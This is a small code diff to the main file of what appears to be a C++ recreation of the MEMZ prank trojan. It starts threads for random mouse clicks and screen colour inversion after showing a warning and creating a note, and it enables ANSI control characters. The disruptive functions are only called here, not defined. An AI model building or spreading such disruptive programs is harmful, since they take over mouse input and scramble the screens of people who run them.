@@ -1,15 +1,16 @@
-#include "thread" // I Don't Know Why It Cannot Build In MEMZ.h
 #include "MEMZ.h" // Process Main
 
 using namespace std;
 
 int main()
 {
+    // Initialize //
     disable_redraw(); // Disable Redraw
     StartWarning(); // Warning
     CreateNote(); // Create Note
-    SetFont(10); // Set Font Size To 10
+    AllowANSIControlChar(); // Allow ANSI Control Characters
     Sleep(800); // Wait 0.8 Secounds(Anti Crash)...
+
     // Main Process Zone //
     thread a(infclick); // Random Click
     thread b(infInvColor); // Invert Screen Color
